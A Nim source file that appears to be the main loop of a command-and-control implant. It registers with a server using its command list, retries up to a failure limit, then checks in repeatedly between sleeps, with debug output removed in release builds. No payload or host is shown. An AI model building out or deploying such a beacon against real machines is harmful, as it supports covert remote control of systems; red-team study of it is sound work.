import config
import communication
import commands
import sleep

proc main(): void =
    var registrationFails: int = 0
    var status: int

    # Registration loop
    while true:
        try:
            status = sendRegistration(commands.commands)
        except Exception as e:
            when not defined(release):
                echo "Registration failed: " & e.msg
                registrationFails += 1
                echo "Registration fails: " & $registrationFails

            status = -1

        when not defined(release):
            echo "Registration sent, status: " & $status

        if status == STATUS_CONTINUE:
            break
        else:
            registrationFails += 1

            when not defined(release):
                echo "Registration fails: " & $registrationFails

            if registrationFails >= REG_FAIL_LIMIT:
                when not defined(release):
                    echo "Registration fail limit hit, quitting..."

                quit(0)

            else:
                doSleep()

    # Checkin loop
    while true:
        try:
            checkin()
        except Exception as e:
            when not defined(release):
                echo "Checkin failed: " & e.msg

            discard
        
        doSleep()

if isMainModule:
    main()
